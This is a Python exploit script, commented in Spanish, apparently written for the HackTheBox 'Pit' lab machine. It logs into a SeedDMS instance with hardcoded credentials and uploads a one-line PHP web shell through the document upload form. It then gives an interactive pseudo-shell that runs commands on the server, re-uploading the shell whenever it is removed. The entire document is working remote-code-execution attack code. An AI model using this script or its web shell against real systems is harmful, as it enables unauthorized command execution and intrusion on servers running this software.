#!/usr/bin/python3

import requests
import signal, re
from bs4 import BeautifulSoup

# Variables globales (la mayoria lo son e.e)
url = "http://dms-pit.htb/seeddms51x"
session = requests.Session()

# Clases.
class Color:
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

# Funciones.
def def_handler(sig, frame):  # Controlamos salida forzada mediante Ctrl+C
    deletePHPfile()
    print(Color.RED+ "\nv3moSs...\n" + Color.END)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

def upPHPfile():
    data_file = [
        ("userfile[]",
            ("1.php", "<?php system($_GET['xmd']); ?>", "application/x-php"))]
    data_post = {
        "formtoken" : token_form,
        "folderid" : "8",
        "showtree" : "1",
        "name" : "1.php",
        "comment" : "",
        "keywords" : "",
        "sequence" : "4",
        "presetexpdate" : "never",
        "expdate" : "",
        "reqversion" : "1",
        "version_comment" : ""
    }
    r = session.post(url + '/seeddms/op/op.AddDocument.php', data=data_post, files=data_file)

    # |_ Extraemos ID del archivo creado
    r = session.get(url + '/seeddms/out/out.MyDocuments.php')
    r_html = BeautifulSoup(r.text, "html.parser")

    # |_ - https://www.pluralsight.com/guides/extracting-data-html-beautifulsoup
    for html_a in r_html.find_all("a"):
        if "1.php" in html_a:
            file_id = html_a.get("href").split('=')[1]

    return file_id

def deletePHPfile():
    try:
        # Extraemos un nuevo token
        # - https://stackoverflow.com/questions/35917164/how-to-extract-name-value-pairs-with-beautifulsoup
        r = session.get(url + '/seeddms/out/out.RemoveDocument.php', params={"documentid":file_id})
        r_html = BeautifulSoup(r.text, "html.parser")

        for html_input in r_html.find_all("input"):
            if "formtoken" in str(html_input):
                token_form = html_input.get("value")

        # Hacemos el borrado
        r = session.post(url + '/seeddms/op/op.RemoveDocument.php', data={"documentid":file_id,"formtoken":token_form})
    except Exception as err:
        pass

# Inicio del programa.

# Login
data_post = {
    "referuri" : "/seeddms51x/seeddms/",
    "login" : "michelle",
    "pwd" : "michelle",
    "lang" : ""
}
r = session.post(url + '/seeddms/op/op.Login.php', data=data_post)

if "Folder 'DMS'" not in r.text:
    print("Error al iniciar sesión")
    exit(1)

# Subimos archivo PHP
# |_ Extraemos token
r = session.get(url + '/seeddms/out/out.AddDocument.php', params={"folderid":"8","showtree":"1"})
token_form = re.findall(r'<input type="hidden" name="formtoken" value="(.*?)"', r.text)[0]

# |_ Ahora si, subimos archivo :P
file_id = upPHPfile()

# |_ Generamos la fake-shell
print(Color.YELLOW + "\nSi en algún momento quieres salir de la fake puedes escribir: salir\n" + Color.END)
while True:
    command = input(Color.RED + "nginx@pit:/casita" + Color.END + Color.YELLOW + "$ " + Color.END)

    complement_url = "/data/1048576/%s/1.php" % (file_id)
    r = session.get(url + complement_url, params={"xmd":command})

    if "File not found" in r.text:
        # Borramos archivo PHP
        deletePHPfile()
        # Creamos nuevo archivo PHP
        file_id = upPHPfile()
        # Resultado del comando
        complement_url = "/data/1048576/%s/1.php" % (file_id)
        r = session.get(url + complement_url, params={"xmd":command})
        print(Color.BLUE + r.text + Color.END)
    elif command.lower() == "salir":
        deletePHPfile()
        break
    else:
        # Resultado del comando
        print(Color.BLUE + r.text + Color.END)

print(Color.YELLOW + "A ROMPEEEEEEEEEEER!!\n" + Color.END)
